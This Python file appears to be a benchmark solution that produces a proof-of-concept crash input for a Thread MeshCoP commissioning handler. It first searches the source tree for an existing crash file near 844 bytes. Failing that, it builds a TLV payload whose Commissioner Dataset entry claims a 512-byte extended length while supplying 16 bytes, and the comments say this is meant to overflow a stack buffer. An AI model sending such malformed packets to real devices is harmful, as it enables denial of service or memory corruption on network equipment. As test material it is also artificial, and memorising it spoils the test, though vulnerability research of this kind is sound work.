import os
import re
import stat
from typing import Optional


class Solution:
    def __init__(self) -> None:
        self.TARGET_SIZE = 844
        self.MAX_CANDIDATE_SIZE = 4096

    def solve(self, src_path: str) -> bytes:
        poc = self._find_poc_file(src_path)
        if poc is not None:
            return poc
        poc = self._generate_structured_poc(src_path)
        return poc

    # ---------------- PoC file discovery ----------------

    def _find_poc_file(self, src_path: str) -> Optional[bytes]:
        target = self.TARGET_SIZE
        best_data: Optional[bytes] = None
        best_score = -1

        keywords = [
            'poc', 'crash', 'seed', 'corpus', 'regress', 'fuzz',
            'commission', 'commiss', 'meshcop', 'tlv',
            'handlecommissioningset', 'commissioningset', 'network-data'
        ]
        binary_exts = {'', '.bin', '.raw', '.dat', '.poc', '.input', '.case'}
        skip_dirs = {
            '.git', '.hg', '.svn', '.idea', '.vs', 'build', 'cmake-build-debug',
            'cmake-build-release', 'out', 'bazel-out', 'node_modules', '__pycache__'
        }

        for root, dirs, files in os.walk(src_path):
            dirs[:] = [d for d in dirs if d not in skip_dirs and not d.startswith('.')]
            for fname in files:
                path = os.path.join(root, fname)
                try:
                    st = os.stat(path)
                except OSError:
                    continue
                if not stat.S_ISREG(st.st_mode):
                    continue
                size = st.st_size
                if size == 0 or size > self.MAX_CANDIDATE_SIZE:
                    continue
                try:
                    with open(path, 'rb') as f:
                        data = f.read()
                except OSError:
                    continue

                lower_path = path.lower()
                has_kw = any(k in lower_path for k in keywords)
                base, ext = os.path.splitext(fname)
                ext = ext.lower()
                is_binaryish_ext = (ext in binary_exts) or ('.' not in fname)

                is_ascii = self._is_mostly_ascii(data)
                newline_cnt = data.count(b'\n')

                # Fast path: exact match with strong hints.
                if (
                    size == target
                    and has_kw
                    and (is_binaryish_ext or not is_ascii)
                ):
                    return data

                # Filter out obvious text/source files
                if is_ascii and not has_kw:
                    continue
                if is_ascii and newline_cnt > 40:
                    # Very likely a source/text file
                    continue

                closeness = max(0, 50 - abs(size - target))  # 0..50
                heuristic = 0
                if has_kw:
                    heuristic += 80
                if is_binaryish_ext:
                    heuristic += 25
                if not is_ascii:
                    heuristic += 15
                else:
                    heuristic += 3
                if is_ascii and newline_cnt > 10:
                    heuristic -= 20

                score = heuristic + closeness
                if score > best_score:
                    best_score = score
                    best_data = data

        if best_data is not None and best_score >= 60:
            return best_data
        return None

    def _is_mostly_ascii(self, data: bytes) -> bool:
        if not data:
            return True
        ascii_count = 0
        for b in data:
            if 0x09 <= b <= 0x0d or 0x20 <= b <= 0x7e:
                ascii_count += 1
        return ascii_count / len(data) > 0.9

    # ---------------- Structured PoC generation ----------------

    def _generate_structured_poc(self, src_path: str) -> bytes:
        tlv_info = self._extract_meshcop_tlv_info(src_path)
        if tlv_info is not None:
            return self._build_tlv_poc(tlv_info)
        return self._generic_guess_poc()

    def _extract_meshcop_tlv_info(self, src_path: str) -> Optional[dict]:
        # Collect simple integer macros: NAME -> int
        macros: dict[str, int] = {}
        int_literal_re = re.compile(
            r'^\s*#\s*define\s+(\w+)\s+([0-9]+|0x[0-9a-fA-F]+)\b'
        )

        for root, dirs, files in os.walk(src_path):
            dirs[:] = [d for d in dirs if not d.startswith('.')]
            for fname in files:
                if not fname.endswith(('.h', '.hpp', '.hh', '.hxx', '.c', '.cc', '.cpp', '.cxx')):
                    continue
                path = os.path.join(root, fname)
                try:
                    with open(path, 'r', errors='ignore') as f:
                        for line in f:
                            m = int_literal_re.match(line)
                            if m:
                                name = m.group(1)
                                val_str = m.group(2)
                                try:
                                    val = int(val_str, 0)
                                except ValueError:
                                    continue
                                macros[name] = val
                except OSError:
                    continue

        state_val: Optional[int] = None
        comm_val: Optional[int] = None

        enum_item_re = re.compile(r'\b(kState|kCommissionerDataset)\b\s*(?:=\s*([^,\n\/]+))?')

        for root, dirs, files in os.walk(src_path):
            dirs[:] = [d for d in dirs if not d.startswith('.')]
            for fname in files:
                if not fname.endswith(('.h', '.hpp', '.hh', '.hxx', '.c', '.cc', '.cpp', '.cxx')):
                    continue
                path = os.path.join(root, fname)
                try:
                    with open(path, 'r', errors='ignore') as f:
                        text = f.read()
                except OSError:
                    continue
                if 'kState' not in text and 'kCommissionerDataset' not in text:
                    continue

                for m in enum_item_re.finditer(text):
                    name = m.group(1)
                    rhs = m.group(2)
                    if not rhs:
                        continue
                    rhs_clean = rhs.strip()
                    # Remove comments and trailing comma
                    rhs_clean = rhs_clean.split('//', 1)[0]
                    rhs_clean = rhs_clean.split('/*', 1)[0]
                    rhs_clean = rhs_clean.split(',', 1)[0]
                    rhs_clean = rhs_clean.strip().rstrip('uUlL')

                    val: Optional[int] = None
                    if rhs_clean:
                        try:
                            val = int(rhs_clean, 0)
                        except ValueError:
                            val = macros.get(rhs_clean)
                    if val is None:
                        continue

                    if name == 'kState' and state_val is None:
                        state_val = val
                    elif name == 'kCommissionerDataset' and comm_val is None:
                        comm_val = val

        if state_val is not None and comm_val is not None:
            return {'state_type': state_val, 'comm_dataset_type': comm_val}
        return None

    def _build_tlv_poc(self, tlv_info: dict) -> bytes:
        state_type = tlv_info['state_type'] & 0xFF
        comm_type = tlv_info['comm_dataset_type'] & 0xFF

        # State TLV: type, length, state_value(accept=1)
        state_value = 1
        state_tlv = bytes([state_type, 1, state_value])

        # Commissioner Dataset TLV with extended length that is larger than any
        # reasonable stack buffer in the vulnerable handler.
        ext_len = 512  # claimed length
        length_hi = (ext_len >> 8) & 0xFF
        length_lo = ext_len & 0xFF

        # Provide a small actual value; copy routines may rely on ext_len.
        dataset_value = b'A' * 16
        comm_tlv = bytes([comm_type, 0xFF, length_hi, length_lo]) + dataset_value

        payload = state_tlv + comm_tlv

        # Pad or trim to target length
        target = self.TARGET_SIZE
        if len(payload) < target:
            payload += b'B' * (target - len(payload))
        elif len(payload) > target:
            payload = payload[:target]
        return payload

    def _generic_guess_poc(self) -> bytes:
        # Generic MeshCoP-like TLV layout as a fallback.
        # State TLV: type=1, length=1, value=1 (accept)
        state_tlv = bytes([1, 1, 1])

        # Commissioner Dataset TLV: type=2, extended length=512, small body.
        ext_len = 512
        comm_tlv = bytes([
            2,           # type
            0xFF,        # extended length marker
            (ext_len >> 8) & 0xFF,
            ext_len & 0xFF,
        ]) + b'A' * 16

        payload = state_tlv + comm_tlv

        target = self.TARGET_SIZE
        if len(payload) < target:
            payload += b'C' * (target - len(payload))
        elif len(payload) > target:
            payload = payload[:target]
        return payload
